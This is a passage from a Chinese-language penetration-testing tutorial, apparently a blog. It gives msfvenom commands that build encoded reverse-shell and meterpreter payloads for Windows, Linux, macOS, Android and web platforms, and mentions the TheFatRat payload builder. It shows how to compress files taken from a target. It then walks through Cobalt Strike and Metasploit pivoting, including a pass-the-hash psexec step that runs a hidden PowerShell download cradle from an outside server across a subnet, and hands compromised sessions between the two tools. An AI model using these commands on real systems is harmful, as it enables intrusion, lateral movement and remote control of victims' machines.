<img src="https://img-blog.csdnimg.cn/20201007213541521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>优点：适用于隐蔽传输。最小化被发现。<br>
缺点：适用于传输小文件。</p>
<hr>
<h2><a id="85_msfvenompayload_6100"></a>8.5 msfvenom常用生成payload命令</h2>
<p><strong>windows:</strong></p>
<pre><code class="prism language-c">msfvenom <span class="token operator">-</span>a x86 <span class="token operator">--</span>platform Windows <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span>攻击机IP LPORT<span class="token operator">=</span>攻击机端口 <span class="token operator">-</span>e x86<span class="token operator">/</span>shikata_ga_nai <span class="token operator">-</span>b <span class="token string">'x00x0axff'</span> <span class="token operator">-</span>i <span class="token number">3</span> <span class="token operator">-</span>f exe <span class="token operator">-</span>opayload<span class="token punctuation">.</span>exe
</code></pre>
<p><strong>mac:</strong></p>
<pre><code class="prism language-c">msfvenom <span class="token operator">-</span>a x86 <span class="token operator">--</span>platform osx <span class="token operator">-</span>p osx<span class="token operator">/</span>x86<span class="token operator">/</span>shell_reverse_tcp LHOST<span class="token operator">=</span>攻击机IP
LPORT<span class="token operator">=</span>攻击机端口 <span class="token operator">-</span>f macho <span class="token operator">-</span>o payload<span class="token punctuation">.</span>macho
</code></pre>
<p><strong>android:</strong></p>
<pre><code class="prism language-c"><span class="token comment">//需要签名</span>
msfvenom <span class="token operator">-</span>a x86 <span class="token operator">--</span>platform Android <span class="token operator">-</span>p android<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span>攻击机IP LPORT<span class="token operator">=</span>攻击机端口 <span class="token operator">-</span>f apk <span class="token operator">-</span>o payload<span class="token punctuation">.</span>apk
</code></pre>
<p><strong>powershell:</strong></p>
<pre><code class="prism language-c">msfvenom <span class="token operator">-</span>a x86 <span class="token operator">--</span>platform Windows <span class="token operator">-</span>p windows<span class="token operator">/</span>powershell_reverse_tcp LHOST<span class="token operator">=</span>
攻击机IP LPORT<span class="token operator">=</span>攻击机端口 <span class="token operator">-</span>e cmd<span class="token operator">/</span>powershell_base64 <span class="token operator">-</span>i <span class="token number">3</span> <span class="token operator">-</span>f raw <span class="token operator">-</span>o payload<span class="token punctuation">.</span>ps1
</code></pre>
<p><strong>linux:</strong></p>
<pre><code class="prism language-c">msfvenom <span class="token operator">-</span>a x86 <span class="token operator">--</span>platform Linux <span class="token operator">-</span>p linux<span class="token operator">/</span>x86<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span>攻击机IP LPORT<span class="token operator">=</span>攻击机端口 <span class="token operator">-</span>f elf <span class="token operator">-</span>o payload<span class="token punctuation">.</span>elf
</code></pre>
<p><strong>php:</strong></p>
<pre><code class="prism language-c">msfvenom <span class="token operator">-</span>p php<span class="token operator">/</span>meterpreter_reverse_tcp LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">&gt;</span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">&gt;</span> <span class="token operator">-</span>f raw <span class="token operator">&gt;</span> shell<span class="token punctuation">.</span>php
cat shell<span class="token punctuation">.</span>php <span class="token operator">|</span> pbcopy <span class="token operator">&amp;&amp;</span> echo <span class="token string">'&lt;?php '</span> <span class="token operator">|</span> tr <span class="token operator">-</span>d <span class="token string">'n'</span> <span class="token operator">&gt;</span> shell<span class="token punctuation">.</span>php <span class="token operator">&amp;&amp;</span> pbpaste <span class="token operator">&gt;&gt;</span> shell<span class="token punctuation">.</span>php
</code></pre>
<p><strong>aspx:</strong></p>
<pre><code class="prism language-c">msfvenom <span class="token operator">-</span>a x86 <span class="token operator">--</span>platform windows <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span>
攻击机IP LPORT<span class="token operator">=</span>攻击机端口 <span class="token operator">-</span>f aspx <span class="token operator">-</span>o payload<span class="token punctuation">.</span>aspx
</code></pre>
<p><strong>jsp:</strong></p>
<pre><code class="prism language-c">msfvenom <span class="token operator">--</span>platform java <span class="token operator">-</span>p java<span class="token operator">/</span>jsp_shell_reverse_tcp LHOST<span class="token operator">=</span>攻击机IP LPORT<span class="token operator">=</span>攻击机端口 <span class="token operator">-</span>f raw <span class="token operator">-</span>o payload<span class="token punctuation">.</span>jsp
</code></pre>
<p><strong>war:</strong></p>
<pre><code class="prism language-c">msfvenom <span class="token operator">-</span>p java<span class="token operator">/</span>jsp_shell_reverse_tcp LHOST<span class="token operator">=</span>攻击机IP LPORT<span class="token operator">=</span>攻击机端口 <span class="token operator">-</span>f raw <span class="token operator">-</span>
o payload<span class="token punctuation">.</span>war
</code></pre>
<p><strong>nodejs:</strong></p>
<pre><code class="prism language-c">msfvenom <span class="token operator">-</span>p nodejs<span class="token operator">/</span>shell_reverse_tcp LHOST<span class="token operator">=</span>攻击机IP LPORT<span class="token operator">=</span>攻击机端口 <span class="token operator">-</span>f raw <span class="token operator">-</span>o
payload<span class="token punctuation">.</span>js
</code></pre>
<p><strong>python:</strong></p>
<pre><code class="prism language-c">msfvenom <span class="token operator">-</span>p python<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span>攻击机IP LPORT<span class="token operator">=</span>攻击机端口 <span class="token operator">-</span>
f raw <span class="token operator">-</span>o payload<span class="token punctuation">.</span>py
</code></pre>
<p><strong>perl:</strong></p>
<pre><code class="prism language-c">msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_perl LHOST<span class="token operator">=</span>攻击机IP LPORT<span class="token operator">=</span>攻击机端口 <span class="token operator">-</span>f raw <span class="token operator">-</span>o
payload<span class="token punctuation">.</span>pl
</code></pre>
<p><strong>ruby:</strong></p>
<pre><code class="prism language-c">msfvenom <span class="token operator">-</span>p ruby<span class="token operator">/</span>shell_reverse_tcp LHOST<span class="token operator">=</span>攻击机IP LPORT<span class="token operator">=</span>攻击机端口 <span class="token operator">-</span>f raw <span class="token operator">-</span>o
payload<span class="token punctuation">.</span>rb
</code></pre>
<p><strong>lua:</strong></p>
<pre><code class="prism language-c">msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_lua LHOST<span class="token operator">=</span>攻击机IP LPORT<span class="token operator">=</span>攻击机端口 <span class="token operator">-</span>f raw <span class="token operator">-</span>o
payload<span class="token punctuation">.</span>lua
</code></pre>
<p><strong>windows shellcode:</strong></p>
<pre><code class="prism language-c">msfvenom <span class="token operator">-</span>a x86 <span class="token operator">--</span>platform Windows <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span>
攻击机IP LPORT<span class="token operator">=</span>攻击机端口 <span class="token operator">-</span>f c
</code></pre>
<p><strong>linux shellcode:</strong></p>
<pre><code class="prism language-c">msfvenom <span class="token operator">-</span>a x86 <span class="token operator">--</span>platform Linux <span class="token operator">-</span>p linux<span class="token operator">/</span>x86<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span>攻
击机IP LPORT<span class="token operator">=</span>攻击机端口 <span class="token operator">-</span>f c
</code></pre>
<p><strong>mac shellcode:</strong></p>
<pre><code class="prism language-c">msfvenom <span class="token operator">-</span>a x86 <span class="token operator">--</span>platform osx <span class="token operator">-</span>p osx<span class="token operator">/</span>x86<span class="token operator">/</span>shell_reverse_tcp LHOST<span class="token operator">=</span>攻击机IP
LPORT<span class="token operator">=</span>攻击机端口 <span class="token operator">-</span>f c
</code></pre>
<p><strong>便捷化payload生成:</strong></p>
<p>项目地址:</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>Screetsec<span class="token operator">/</span>TheFatRat
</code></pre>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop# git clone https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>Screetsec<span class="token operator">/</span>TheFatRat<span class="token punctuation">.</span>git
<span class="token comment">//设置时需要挂墙</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201007214955367.png#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201007215000895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201007215009214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>附录:</strong><br>
<strong>中文使用说明:</strong><br>
<strong>Options:</strong></p>
<pre><code class="prism language-c"><span class="token operator">-</span>p<span class="token punctuation">,</span> <span class="token operator">--</span>payload <span class="token operator">&lt;</span>payload<span class="token operator">&gt;</span> 使用指定的payload
<span class="token operator">--</span>payload<span class="token operator">-</span>options 列出该payload参数
<span class="token operator">-</span>l<span class="token punctuation">,</span> <span class="token operator">--</span>list <span class="token punctuation">[</span>type<span class="token punctuation">]</span> 列出所有的payloads
<span class="token operator">-</span>n<span class="token punctuation">,</span> <span class="token operator">--</span>nopsled <span class="token operator">&lt;</span>length<span class="token operator">&gt;</span> 为payload指定一个 nopsled 长度
<span class="token operator">-</span>f<span class="token punctuation">,</span> <span class="token operator">--</span>format <span class="token operator">&lt;</span>format<span class="token operator">&gt;</span> 指定payload生成格式
<span class="token operator">--</span>help<span class="token operator">-</span>formats 查看所有支持格式
<span class="token operator">-</span>e<span class="token punctuation">,</span> <span class="token operator">--</span>encoder <span class="token operator">&lt;</span>encoder<span class="token operator">&gt;</span> 使用编码器
<span class="token operator">-</span>a<span class="token punctuation">,</span> <span class="token operator">--</span>arch <span class="token operator">&lt;</span>arch<span class="token operator">&gt;</span> 指定payload构架
<span class="token operator">--</span>platform <span class="token operator">&lt;</span>platform<span class="token operator">&gt;</span> 指定payload平台
<span class="token operator">--</span>help<span class="token operator">-</span>platforms 显示支持的平台
<span class="token operator">-</span>s<span class="token punctuation">,</span> <span class="token operator">--</span>space <span class="token operator">&lt;</span>length<span class="token operator">&gt;</span> 设定payload攻击荷载的最大长度
<span class="token operator">--</span>encoder<span class="token operator">-</span>space <span class="token operator">&lt;</span>length<span class="token operator">&gt;</span> The maximum size of the encoded payload
<span class="token punctuation">(</span>defaults to the <span class="token operator">-</span>s value<span class="token punctuation">)</span>
<span class="token operator">-</span>b<span class="token punctuation">,</span> <span class="token operator">--</span>bad<span class="token operator">-</span>chars <span class="token operator">&lt;</span>list<span class="token operator">&gt;</span> 指定bad<span class="token operator">-</span>chars 如<span class="token punctuation">:</span> <span class="token string">'x00xff'</span>

<span class="token operator">-</span>i<span class="token punctuation">,</span> <span class="token operator">--</span>iterations <span class="token operator">&lt;</span>count<span class="token operator">&gt;</span> 指定编码次数
<span class="token operator">-</span>c<span class="token punctuation">,</span> <span class="token operator">--</span>add<span class="token operator">-</span>code <span class="token operator">&lt;</span>path<span class="token operator">&gt;</span> 指定个win32 shellcode 文件
<span class="token operator">-</span>x<span class="token punctuation">,</span> <span class="token operator">--</span>template <span class="token operator">&lt;</span>path<span class="token operator">&gt;</span> 指定一个 executable 文件作为模板
<span class="token operator">-</span>k<span class="token punctuation">,</span> <span class="token operator">--</span>keep payload自动分离并注入到新的进程
<span class="token operator">-</span>o<span class="token punctuation">,</span> <span class="token operator">--</span>out <span class="token operator">&lt;</span>path<span class="token operator">&gt;</span> 存放生成的payload
<span class="token operator">-</span>v<span class="token punctuation">,</span> <span class="token operator">--</span>var<span class="token operator">-</span>name <span class="token operator">&lt;</span>name<span class="token operator">&gt;</span> 指定自定义变量
<span class="token operator">--</span>smallest Generate the smallest possible payload
<span class="token operator">-</span>h<span class="token punctuation">,</span> <span class="token operator">--</span>help 显示帮助文件
</code></pre>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>kanxue<span class="token punctuation">.</span>com<span class="token operator">/</span>book<span class="token operator">-</span><span class="token number">38</span><span class="token operator">-</span><span class="token number">445.</span>htm   高级渗透第十课
</code></pre>
<hr>
<h2><a id="86_windows_6271"></a>8.6 windows环境压缩文件&amp;文件夹命令合集</h2>
<p>本篇文章会介绍几种常用的 windows打包、压缩文件&amp;文件夹的方法。</p>
<p><strong>压缩工具 Winrar</strong></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>u2s1<span class="token operator">/</span>winrarsc
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201007215924166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
实际使用情况,直接把 Winrar.exe上传至目标机即可, Winrar大约400k。</p>
<p>常用压缩命令为 :</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\RECYCLER\Winrar<span class="token punctuation">.</span>exe a <span class="token operator">-</span>k <span class="token operator">-</span>r <span class="token operator">-</span>s <span class="token operator">-</span>m5 tmp<span class="token punctuation">.</span>rar srcdir 
</code></pre>
<p>常用解压命令为：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\RECYCLER\Winrar<span class="token punctuation">.</span>exe x <span class="token operator">-</span>t <span class="token operator">-</span>o <span class="token operator">-</span>p d<span class="token punctuation">:</span>\web<span class="token punctuation">.</span>rar d<span class="token punctuation">:</span>\desdir

desdir文件夹需存在
</code></pre>
<hr>
<p><strong>压缩工具7za</strong></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span><span class="token number">7</span><span class="token operator">-</span>zip<span class="token punctuation">.</span>org   <span class="token operator">--</span>官网
</code></pre>
<p>7za常用命令<br>
查看压缩文件内容(如判断目标机上压缩文件是否有价值)</p>
<pre><code class="prism language-c"><span class="token number">7</span>za l target<span class="token punctuation">.</span>zip
</code></pre>
<p>常用压缩命令如下</p>
<p>按照默认压缩类型进行压缩,7za会自动遍历所压缩文件夹内的子文件、子文件夹，默认压缩类型为7z即参数-a -t7z，其中-mx9为7z模式中UItra compressing</p>
<pre><code class="prism language-c"><span class="token number">7</span>za a <span class="token operator">-</span>mx<span class="token operator">=</span><span class="token number">9</span> archive1<span class="token punctuation">.</span>zip test
</code></pre>
<p>如果需要使用其他压缩类型，如zip</p>
<pre><code class="prism language-c"><span class="token number">7</span>za a <span class="token operator">-</span>tzip archive1<span class="token punctuation">.</span>zip test 
</code></pre>
<p>常用解压缩命令如下，too文件夹7za自动创建。</p>
<pre><code class="prism language-c"><span class="token number">7</span>za x tmp<span class="token punctuation">.</span><span class="token number">7</span>z c<span class="token punctuation">:</span>\windows\temp\tool 
</code></pre>
<p>或者压缩文件、文件夹时，需排除某些文件夹，不压缩上面-x 后面的文件夹内文件，文件夹名有空格需用双引号引起来，命令如下</p>
<p>排除文件</p>
<pre><code class="prism language-c"><span class="token number">7</span>za a archive1<span class="token punctuation">.</span>zip test <span class="token operator">-</span>x<span class="token operator">!</span>treeNMS<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.4</span><span class="token punctuation">.</span>zip 
</code></pre>
<p>排除文件夹</p>
<pre><code class="prism language-c"><span class="token number">7</span>za a archive1<span class="token punctuation">.</span>zip test <span class="token operator">-</span>xr<span class="token operator">!</span>serverbak
</code></pre>
<hr>
<p><strong>使用 windows自带压缩文件命令</strong></p>
<p><strong>makecab压缩文件命令</strong></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>my<span class="token punctuation">.</span>oschina<span class="token punctuation">.</span>net<span class="token operator">/</span>hkmax<span class="token operator">/</span>blog<span class="token operator">/</span><span class="token number">144293</span>   <span class="token operator">--</span>makecab 方法
</code></pre>
<p>makecab可压缩单个文件或多个文件,但无法压缩文件夹压缩单个文件命令为</p>
<pre><code class="prism language-c">makecab <span class="token number">1.</span> txt <span class="token number">1.</span>zip
</code></pre>
<p><strong>expand解压缩命令</strong></p>
<p>解压缩test1.cab至c:\windows\temp\tool目录，tool目录必须存在</p>
<pre><code class="prism language-c">expand D<span class="token punctuation">:</span>\dayu\test1<span class="token punctuation">.</span>cab <span class="token operator">-</span>f<span class="token punctuation">:</span><span class="token operator">*</span> c<span class="token punctuation">:</span>\windows\temp\tool
</code></pre>
<p><strong>zip.vbs解压方法</strong></p>
<p>windows文件管理器自带压缩、解压缩功能( zipped)，属于explorer的功能，无法命令行调用，具体介绍传送门( https://filext.com/faq/compressed_zip_folder.html)，此处zip.vbs为调用COM接口从而调用自带的 explorer zip</p>
<p>压缩文件命令为</p>
<pre><code class="prism language-c">CScript zip<span class="token punctuation">.</span>vbs C<span class="token punctuation">:</span>\test C<span class="token punctuation">:</span>\target<span class="token punctuation">.</span>zip
</code></pre>
<p><strong>powershell缩文件夹</strong></p>
<p>将文件或文件夹test压缩为test.zip</p>
<pre><code class="prism language-c">powershell Compress<span class="token operator">-</span>Archive <span class="token operator">-</span>Path D<span class="token punctuation">:</span>\test <span class="token operator">-</span>DestinationPath E<span class="token punctuation">:</span>\test<span class="token punctuation">.</span>zip
</code></pre>
<p>将文件test.zip解压到test目录下</p>
<pre><code class="prism language-c">powershell Expand<span class="token operator">-</span>Archive <span class="token operator">-</span>Path E<span class="token punctuation">:</span>\test<span class="token punctuation">.</span>zip <span class="token operator">-</span>DestinationPath F<span class="token punctuation">:</span>\test
</code></pre>
<hr>
<h2><a id="87_Windows_net__6389"></a>8.7 Windows net 命令集使用</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>cnblogs<span class="token punctuation">.</span>com<span class="token operator">/</span>iriczhao<span class="token operator">/</span>p<span class="token operator">/</span><span class="token number">10469143.</span>html

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>cloud<span class="token punctuation">.</span>tencent<span class="token punctuation">.</span>com<span class="token operator">/</span>developer<span class="token operator">/</span>article<span class="token operator">/</span><span class="token number">1459966</span>

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>jianshu<span class="token punctuation">.</span>com<span class="token operator">/</span>p<span class="token operator">/</span>b35078a6f030
</code></pre>
<p>认真看完知道有个概念即可！！！</p>
<hr>
<h2><a id="88_CobaltstrikeMetasploit_6401"></a>8.8 Cobaltstrike与Metasploit实战联动</h2>
<p><strong>前言</strong></p>
<p>CobalStrike 与 Metasploit 均是渗透利器，各有所长。前者更适合做稳控平台，后者则更擅长内网各类探测搜集与漏洞利用。两者更需要灵活的联动，各自相互依托，从而提升渗透的效率。</p>
<p><strong>内置Socks功能</strong></p>
<p>通过Beacon内置的socks功能在VPS上开启代理端口，打通目标内网通道，之后将本地Metasploit直接带入目标内网，进行横向渗透。</p>
<p>当然，也可以把代理设置在其他的工具上，不限于Proxychains、Proxifier等。</p>
<p>首先，到已控目标机的Beacon下将socks代理开启。</p>
<pre><code class="prism language-c">beacon <span class="token operator">&gt;</span> socks <span class="token number">1024</span> #端口根据VPS实际情况进行设置
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201007225836910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
点开菜单栏中的View &gt; Proxy Pivots，复制代理连接到Metasploit中。<br>
<img src="https://img-blog.csdnimg.cn/20201007225851510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
本地启动Metasploit，挂上代理，就可以对目标内网进行各种探测搜集。如 探测目标内网中存在MS17_010漏洞的主机，这也是内网拿主机权限利用方式之一。</p>
<pre><code class="prism language-c">msf5 <span class="token operator">&gt;</span> setg Proxies socks4<span class="token operator">/</span><span class="token number">5</span><span class="token punctuation">:</span>ip<span class="token punctuation">:</span>port #让msf所有模块的流量都通过此代理走。<span class="token punctuation">(</span>setg全局设置<span class="token punctuation">)</span>
msf5 <span class="token operator">&gt;</span> setg ReverseAllowProxy true #允许反向代理，通过socks反弹shell，建立双向通道。<span class="token punctuation">(</span>探测可以不设置此项<span class="token punctuation">)</span>
msf5 <span class="token operator">&gt;</span> use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_ms17_010
msf5 <span class="token operator">&gt;</span> set rhosts <span class="token number">192.168</span><span class="token number">.144</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span>
msf5 <span class="token operator">&gt;</span> set threads <span class="token number">100</span> #内网渗透时线程不要太高！
msf5 <span class="token operator">&gt;</span> run
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201007225923129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>利用MSF模块上线Beacon shell</strong></p>
<p>当通过其它方式拿到了目标内网中某台Windows机器的本地管理员明文密码或hash时，可利用Metasploit下auxiliary/admin/smb/psexec_command模块，直接上线指定目标机器的Beacon shell。(前提目标机可出网)</p>
<p>先利用CobalStrike生成上线Beacon的powershell。<br>
<img src="https://img-blog.csdnimg.cn/20201007225941785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
本地启动Metasploit，挂上代理，设置psexec_command模块参数</p>
<pre><code class="prism language-c">msf5 <span class="token operator">&gt;</span> setg Proxies socks4<span class="token operator">/</span><span class="token number">5</span><span class="token punctuation">:</span>ip<span class="token punctuation">:</span>port
msf5 <span class="token operator">&gt;</span> use auxiliary<span class="token operator">/</span>admin<span class="token operator">/</span>smb<span class="token operator">/</span>psexec_command
msf5 <span class="token operator">&gt;</span> set rhosts <span class="token number">192.168</span><span class="token number">.144</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span>
msf5 <span class="token operator">&gt;</span> set threads <span class="token number">10</span>
msf5 <span class="token operator">&gt;</span> set smbuser administrator
msf5 <span class="token operator">&gt;</span> set smbpass aad3b435b51404eeaad3b435b51404ee<span class="token punctuation">:</span><span class="token number">579</span>da618cfbfa85247acf1f800a280a4 #明文、密文均可
msf5 <span class="token operator">&gt;</span> set command powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>nop <span class="token operator">-</span>w hidden <span class="token operator">-</span>c <span class="token string">"IEX ((new-object net.webclient).downloadstring('http://149.28.xx.xx:80/a'))"</span> #上线CS的powershell，目标机存在杀软需考虑
msf5 <span class="token operator">&gt;</span> run
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201007230011788.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
最终，只要密码一致、 能出网，且未被杀软阻止的均会成功上线。</p>
<p><strong>CS与MSF会话互传</strong></p>
<p><strong>CobaltStrike派生Metasploit</strong></p>
<p>当CobaltStrike获得了一个上线机器，想把这个目标传给Metasploit中的meterpreter，获得一个session进行控制。在Metasploit执行以下命令：</p>
<pre><code class="prism language-c">msf5 <span class="token operator">&gt;</span> use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler
msf5 <span class="token operator">&gt;</span> set payload windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp #不要用x64的payload
msf5 <span class="token operator">&gt;</span> set lhost <span class="token number">10.11</span><span class="token number">.42</span><span class="token number">.99</span>
msf5 <span class="token operator">&gt;</span> set lport <span class="token number">5353</span>
msf5 <span class="token operator">&gt;</span> run <span class="token operator">-</span>j
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201007230044445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
之后使用CobaltStrike创建一个windows/foreign/reverse_tcp的Listener。其中IP为Metasploit的监听地址，端口为Metasploit所监听的端口<br>
<img src="https://img-blog.csdnimg.cn/2020100723010350.png#pic_center" alt="在这里插入图片描述"><br>
然后选中计算机，右键-&gt;Spawn：选择MSF的监听器：<br>
<img src="https://img-blog.csdnimg.cn/20201007230113611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
这个时候可以看到，Metasploit上的监听已经上线，现在可以对meterpreter获得的session进行控制。<br>
<img src="https://img-blog.csdnimg.cn/20201007230125523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>Metasploit派生CobaltStrike</strong></p>
<p>现在已经获得了一个meterpreter的session，把session传给CobaltStrike。<br>
<img src="https://img-blog.csdnimg.cn/20201007230144651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在CobaltStrike中创建一个监听者，和上一步类似，这里host需要修改为CobaltStrike客户端IP，创建好之后便监听8099端口，等待着被控机连接。</p>
<p><img src="https://img-blog.csdnimg.cn/20201007230156743.png#pic_center" alt="在这里插入图片描述"><br>
接下来，把meterpreter获得的session转交给CobaltStrike，在Metasploit执行以下命令：</p>
<pre><code class="prism language-c">meterpreter <span class="token operator">&gt;</span> background 
msf5 <span class="token operator">&gt;</span> use exploit<span class="token operator">/</span>windows<span class="token operator">/</span>local<span class="token operator">/</span>payload_inject 
msf5 <span class="token operator">&gt;</span> set payload windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_http
msf5 <span class="token operator">&gt;</span> set lhost <span class="token number">192.168</span><span class="token number">.144</span><span class="token number">.174</span>
msf5 <span class="token operator">&gt;</span> set lport <span class="token number">8099</span>
msf5 <span class="token operator">&gt;</span> set DisablePayloadHandler true   
msf5 <span class="token operator">&gt;</span> set session <span class="token number">1</span>
msf5 <span class="token operator">&gt;</span> run
</code></pre>
<p>解释一下这些参数。由于CobaltStrike的监听器我们使用的是：</p>
<pre><code class="prism language-c">windows<span class="token operator">/</span>beacon_http<span class="token operator">/</span>reverse_http
</code></pre>
<p>所以我们的payload也要使用：</p>
<pre><code class="prism language-c">payload windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_http
</code></pre>
<p>设置本地监听IP和端口：由于监听器是CobaltStrike的，所以要设置成CobaltStrike机器的IP与端口。</p>
<p>默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，这里我们设置：</p>
<pre><code class="prism language-c">set DisablePayloadHandler true
</code></pre>
<p>设置当前的session，执行run。</p>
<p><img src="https://img-blog.csdnimg.cn/20201007230241242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
此时目标机便已成功从CobaltStrike上线。<br>
<img src="https://img-blog.csdnimg.cn/20201007230255995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>总结</strong></p>
<p>关于CobalStrike与Metasploit 的联动利用方式远不止这些，每种方式在实战中都有对应的应用场景，更需要探索与总结。</p>
<hr>
<h2><a id="89__6526"></a>8.9 渗透中常用的复制工具</h2>
